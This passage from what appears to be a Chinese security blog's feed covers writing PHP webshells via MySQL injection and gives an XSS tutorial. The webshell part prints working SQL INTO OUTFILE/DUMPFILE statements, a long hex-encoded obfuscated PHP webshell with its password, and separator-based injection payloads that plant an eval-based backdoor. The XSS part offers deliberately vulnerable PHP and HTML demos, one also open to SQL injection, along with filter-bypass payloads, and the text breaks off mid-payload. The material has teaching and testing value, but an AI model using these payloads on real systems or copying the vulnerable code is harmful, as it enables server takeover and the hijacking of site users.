class="string">`temp`</span> <span class="keyword">FROM</span> <span class="string">`antian365`</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span><span class="string">'D:/www/antian365.php'</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`antian365`</span>;</span><br></pre></td></tr></table></figure><p>select unhex(‘十六进制字符串’) into dumpfile file_path，密码==&gt;pp64mqa2x1rnw68</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="string">'203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/WEB/IPTEST/22.php'</span></span><br></pre></td></tr></table></figure><h2 id="利用分隔符写shell"><a href="#利用分隔符写shell" class="headerlink" title="利用分隔符写shell"></a>利用分隔符写shell</h2><p>当MySQL注入点为盲注或报错，<code>union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>Sqlmap</code>的<code>--os-shell</code>命令所采用的就是这种方式。</p><h3 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h3><ul><li><code>secure_file_priv</code>支持<code>web</code>目录文件导出</li><li>对<code>web</code>目录有写权限</li><li>有绝对路径</li></ul><h3 id="姿势-2"><a href="#姿势-2" class="headerlink" title="姿势"></a>姿势</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 LIMIT 0,1 INTO OUTFILE &#39;E:&#x2F;study&#x2F;WWW&#x2F;evil.php&#39; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e27 --</span><br></pre></td></tr></table></figure><p>同样的技巧，一共有四种形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; fields terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; columns terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;mysql&lt;/code&gt;插入一条&lt;code&gt;php&lt;/code&gt;代码记录输出到&lt;code&gt;http&lt;/code&gt;服务器工作目
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="webshell" scheme="http://mysecroad.github.io/tags/webshell/"/>
    
      <category term="MySql" scheme="http://mysecroad.github.io/tags/MySql/"/>
    
  </entry>
  
  <entry>
    <title>端口漏洞备忘录</title>
    <link href="http://mysecroad.github.io/posts/39451.html"/>
    <id>http://mysecroad.github.io/posts/39451.html</id>
    <published>2020-04-28T02:17:19.000Z</published>
    <updated>2020-04-28T08:50:06.118Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="830b623580e6a5ec1d409816451be0007fe5fe5cd1dee63319b8ed505bbfd9d2"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
      <category term="备忘录" scheme="http://mysecroad.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="备忘录" scheme="http://mysecroad.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS从0到1</title>
    <link href="http://mysecroad.github.io/posts/46185.html"/>
    <id>http://mysecroad.github.io/posts/46185.html</id>
    <published>2020-04-27T13:31:06.000Z</published>
    <updated>2020-05-02T12:27:46.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>XSS可能不如SQL注入、文件上传等漏洞能够直接得到较高权限，但是XSS的运用十分灵活，也会带来很大的危害：</p><ol><li>网络钓鱼</li><li>盗取cookie</li><li>劫持会话</li><li>强制弹出广告、刷流量</li><li>网页挂马</li><li>提升用户权限</li><li>配合其他漏洞，如CSRF</li><li>等等</li></ol><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p><p>反射型XSS：前端 –&gt; 后端 –&gt; 前端</p><p>存储型XSS：前端 –&gt; 后端 –&gt; 数据库 –&gt; 前端</p><p>DOM型XSS：前端</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有<strong>一次性</strong>。</p><p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;反射型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss1&quot;&#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$xss &#x3D; $_GET[&#39;xss1&#39;];</span><br><span class="line">if($xss1 &#x3D;&#x3D; null)&#123;</span><br><span class="line">echo $xss;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/46185/%E5%8F%8D%E5%B0%84.png" alt="反射"></p><p>在输入框中随便输入，发现可以输出出来。</p><p><img src="/posts/46185/test.png" alt="test"></p><p>我们在输入框中插入HTML标签 <code>&lt;h1&gt;test&lt;/h1&gt;</code></p><p><img src="/posts/46185/h1.png" alt="h1标签"></p><p>发现<code>&lt;h1&gt;&lt;/h1&gt;</code>并未输入，我们查看源代码</p><p><img src="/posts/46185/%E6%BA%90%E4%BB%A3%E7%A0%811.png" alt></p><p>可以看出<code>&lt;h1&gt;&lt;/h1&gt;</code>标签被<code>HTML</code>执行了。我们在插入一段<code>HTML</code>代码测试一下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: orange; <span class="attribute">text-align</span>: center; &#125; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/46185/html.png" alt></p><p>发现我们输入的<code>html</code>代码确实被执行了。</p><p>我们再输入<code>js</code>脚本，<code>&lt;script&gt;&lt;/script&gt;</code></p><p><img src="/posts/46185/script.png" alt="script"></p><p>这就是一种典型的反射型XSS，我们可以发现，我们输入恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发。不过我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p><p><a href="http://127.0.0.1/xss/index.php?xss1=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E" target="_blank" rel="noopener">短连接生成</a></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p><p>反射型 访问我们构造的链接</p><p>存储型 访问原网站链接</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我们在本地创建一个<code>xss</code>数据库，里面新建一个<code>messages</code>表，用来存放用户的留言信息，有三个字段：<code>id</code>、<code>username</code>、<code>message</code>。<code>id</code>设为主键，并勾选<strong>自动递增</strong> 。</p><p>前端、后端代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;存储型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;姓名&quot;&#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;message&quot; placeholder&#x3D;&quot;请输入您的留言&quot;&#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;*数据库信息配置*&#x2F;</span><br><span class="line">$host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$port &#x3D; &quot;3306&quot;;</span><br><span class="line">$user &#x3D; &quot;root&quot;;</span><br><span class="line">$pwd &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;XSS&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($host, $user, $pwd, $dbname, $port);</span><br><span class="line"></span><br><span class="line">&#x2F;*直接将留言插入到数据库中*&#x2F;</span><br><span class="line">&#x2F;&#x2F; if isset($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;message&#39;])&#123;</span><br><span class="line">$username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">$message &#x3D; $_POST[&#39;message&#39;];</span><br><span class="line"></span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">$sql &#x3D; &quot;insert into message(username, message) values (&#39;&#123;$username&#125;&#39;, &#39;&#123;$message&#125;&#39;)&quot;;</span><br><span class="line">if($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Error:&quot;.$sql.&quot;&lt;br&gt;&quot;.$conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*查询数据库中的留言*&#x2F;</span><br><span class="line">$sql &#x3D; &quot;select username, message from message&quot;;</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">while($row &#x3D; $result-&gt;fetch_assoc())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;用户名：&quot;. $row[&#39;username&#39;]. &quot;留言内容：&quot;. $row[&#39;message&#39;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p><p><img src="/posts/46185/liuyan.png" alt="留言板"></p><p>我们先随便输入几条留言看看</p><p><img src="/posts/46185/liuyan1.png" alt></p><p>查看一下数据库</p><p><img src="/posts/46185/schema.png" alt></p><p>可以看到我们输入的数据已经插入到数据库中了。</p><p>那么我们能不能像上面一样，插入一些恶意代码呢？试一下</p><p>插入 <code>&lt;script&gt;alert(&quot;hacker xss&quot;)&lt;/script&gt;</code></p><p><img src="/posts/46185/hackerxss.png" alt></p><p>我们插入的留言被执行了。看一下数据库，被插入到数据库中了。</p><p><img src="/posts/46185/alert.png" alt></p><p>我们换个浏览器试一下</p><p><img src="/posts/46185/alert2.png" alt></p><p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/cunchuxss.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p><code>HTML</code>代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>dom xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"id1"</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">"dom-input"</span>).value;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">"id1"</span>&gt;</span>这里会显示输入的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"dom-input"</span> <span class="attr">placeholder</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"change()"</span> <span class="attr">value</span>=<span class="string">"替换"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码很简单，存在JS函数<code>change()</code>，该函数通过<code>DOM</code>操作将元素<code>id1</code>(输出位置)的内容修改为元素<code>dom_input</code>(输入位置)的内容。</p><p>DOM型XSS程序只有<code>HTML</code>代码，并不存在服务器端代码，所以此程序并没有与服务器端进行交互。</p><p>构造如下语句：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://39.97.251.161/usr/uploads/2020/04/449512334.png"</span> <span class="attr">onerror</span>=<span class="string">alert(/DOM</span> <span class="attr">XSS</span>/)/&gt;</span></span><br></pre></td></tr></table></figure><p>直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的<code>alert()</code>函数，来达到弹窗的效果。</p><h2 id="触发标签与属性"><a href="#触发标签与属性" class="headerlink" title="触发标签与属性"></a>触发标签与属性</h2><p><strong>通用总结</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>script</strong></p><p>通常触发方式</p><p><strong>a</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>img</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>div</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><h3 id="简单粗暴的测试payload"><a href="#简单粗暴的测试payload" class="headerlink" title="简单粗暴的测试payload"></a>简单粗暴的测试payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;prompt(1)&gt;</span><br><span class="line">&lt;table background&#x3D;&quot;javascript:confirm(1)&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:confirm(1)&quot;&gt;a&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascrip&amp;#116&amp;#58confirm(1)&quot;&gt;a&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤测试"><a href="#过滤测试" class="headerlink" title="过滤测试"></a>过滤测试</h3><p><strong>payload - 0</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zxcv%20script&lt;&gt;&quot;%27</span><br></pre></td></tr></table></figure><p><strong>payload - 1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 2</strong></p><p>观察是否存在大小写混淆绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCript&gt;alert(1);&lt;&#x2F;scRipt&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 3</strong></p><p>递归构造法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pent&lt;&lt;est&lt;script&gt;erL&gt;ab&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 4</strong></p><p>递归构造法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;&#x2F;sc&lt;&#x2F;script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 5</strong></p><p>查看代码部分的关键词是否被限制了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert</span><br></pre></td></tr></table></figure><p><strong>payload - 6</strong></p><p>测试img标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img 